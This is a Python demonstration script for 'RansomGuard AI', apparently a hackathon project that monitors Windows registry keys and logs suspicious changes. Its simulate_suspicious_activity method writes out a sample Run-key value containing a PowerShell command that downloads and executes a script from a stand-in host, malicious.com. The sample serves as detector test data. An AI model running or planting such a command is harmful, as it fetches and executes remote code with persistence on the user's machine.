#!/usr/bin/env python3
"""
Démonstration de la surveillance du registre Windows
RansomGuard AI - Hackathon Togo IT Days 2025
"""

import asyncio
import logging
import sys
import os
from datetime import datetime

# Configuration du logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Ajouter le chemin du backend
sys.path.append(os.path.dirname(__file__))

from system_access.registry_monitor import RegistryMonitor
from system_access.os_detector import system_access, OSType

class RegistryMonitoringDemo:
    """Démonstration de la surveillance du registre"""
    
    def __init__(self):
        self.registry_monitor = RegistryMonitor()
        self.demo_running = False
        
    async def registry_event_callback(self, event):
        """Callback appelé lors d'un événement de registre"""
        timestamp = event['timestamp']
        key_path = event['key_path']
        change = event['change']
        suspicious = event['suspicious']
        
        # Formater l'affichage
        status_icon = "⚠️" if suspicious else "ℹ️"
        change_type = change['type']
        change_name = change.get('name', 'N/A')
        
        if suspicious:
            logger.warning(f"{status_icon} ÉVÉNEMENT SUSPECT DÉTECTÉ!")
            logger.warning(f"   Clé: {key_path}")
            logger.warning(f"   Changement: {change_type} - {change_name}")
            if 'value' in change:
                logger.warning(f"   Valeur: {change['value']}")
            if 'new_value' in change:
                logger.warning(f"   Nouvelle valeur: {change['new_value']}")
            logger.warning(f"   Timestamp: {timestamp}")
            logger.warning("-" * 50)
        else:
            logger.info(f"{status_icon} Changement registre: {key_path}")
            logger.info(f"   Type: {change_type} - {change_name}")
            logger.info(f"   Timestamp: {timestamp}")
    
    async def start_demo(self):
        """Démarrer la démonstration"""
        if system_access.os_type != OSType.WINDOWS:
            logger.error("❌ Cette démonstration nécessite Windows")
            return
        
        if not self.registry_monitor.registry_available:
            logger.error("❌ Modules Windows requis non installés")
            logger.info("💡 Installez: pip install pywin32")
            return
        
        logger.info("🚀 Démarrage de la démonstration de surveillance du registre")
        logger.info("=" * 60)
        
        # Ajouter le callback
        self.registry_monitor.add_callback(self.registry_event_callback)
        
        # Démarrer la surveillance
        await self.registry_monitor.start_monitoring()
        
        if self.registry_monitor.is_monitoring:
            logger.info("✅ Surveillance du registre démarrée avec succès")
            logger.info(f"📊 Clés surveillées: {len(self.registry_monitor.monitored_keys)}")
            
            # Afficher les clés critiques
            logger.info("🔑 Clés critiques surveillées:")
            for i, key in enumerate(self.registry_monitor.critical_keys[:5], 1):
                logger.info(f"   {i}. {key}")
            if len(self.registry_monitor.critical_keys) > 5:
                logger.info(f"   ... et {len(self.registry_monitor.critical_keys) - 5} autres")
            
            logger.info("=" * 60)
            logger.info("📝 Instructions pour tester:")
            logger.info("1. Ouvrez regedit.exe")
            logger.info("2. Modifiez une clé surveillée (ex: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)")
            logger.info("3. Ajoutez une valeur avec un nom suspect (ex: 'test_app')")
            logger.info("4. Observez la détection en temps réel")
            logger.info("5. Appuyez sur Ctrl+C pour arrêter")
            logger.info("=" * 60)
            
            self.demo_running = True
            
            # Boucle principale de démonstration
            try:
                while self.demo_running:
                    await asyncio.sleep(5)
                    
                    # Afficher les statistiques périodiquement
                    stats = self.registry_monitor.get_monitoring_stats()
                    if stats['total_events'] > 0:
                        logger.info(f"📊 Statistiques: {stats['total_events']} événements, {stats['suspicious_events']} suspects")
                    
            except KeyboardInterrupt:
                logger.info("\n🛑 Arrêt demandé par l'utilisateur")
            finally:
                await self.stop_demo()
        else:
            logger.error("❌ Échec du démarrage de la surveillance")
    
    async def stop_demo(self):
        """Arrêter la démonstration"""
        if self.demo_running:
            logger.info("🛑 Arrêt de la surveillance du registre...")
            await self.registry_monitor.stop_monitoring()
            self.demo_running = False
            
            # Afficher les statistiques finales
            stats = self.registry_monitor.get_monitoring_stats()
            logger.info("=" * 60)
            logger.info("📊 RÉSUMÉ DE LA DÉMONSTRATION")
            logger.info("=" * 60)
            logger.info(f"Total événements: {stats['total_events']}")
            logger.info(f"Événements suspects: {stats['suspicious_events']}")
            logger.info(f"Clés surveillées: {stats['monitored_keys_count']}")
            
            if stats['events_by_key']:
                logger.info("Événements par clé:")
                for key, count in stats['events_by_key'].items():
                    if count > 0:
                        logger.info(f"  {key}: {count} événements")
            
            logger.info("=" * 60)
            logger.info("✅ Démonstration terminée")
    
    def simulate_suspicious_activity(self):
        """Simuler une activité suspecte pour la démonstration"""
        logger.info("🧪 Simulation d'activité suspecte...")
        
        # Simuler un événement suspect
        simulated_event = {
            'timestamp': datetime.now().isoformat(),
            'key_path': r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run",
            'change': {
                'type': 'value_added',
                'name': 'suspicious_app',
                'value': 'powershell.exe -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString(\'http://malicious.com/payload.ps1\')"'
            },
            'suspicious': True
        }
        
        # Traiter l'événement simulé
        asyncio.create_task(
            self.registry_monitor._handle_registry_changes(
                simulated_event['key_path'], 
                [simulated_event['change']]
            )
        )
        
        logger.info("✅ Événement suspect simulé")

async def main():
    """Fonction principale"""
    demo = RegistryMonitoringDemo()
    
    try:
        await demo.start_demo()
    except Exception as e:
        logger.error(f"❌ Erreur lors de la démonstration: {e}")
        await demo.stop_demo()

if __name__ == "__main__":
    print("🔍 Démonstration de surveillance du registre Windows")
    print("RansomGuard AI - Hackathon Togo IT Days 2025")
    print("=" * 60)
    
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🛑 Arrêt de la démonstration")
    except Exception as e:
        print(f"❌ Erreur: {e}")
        sys.exit(1)
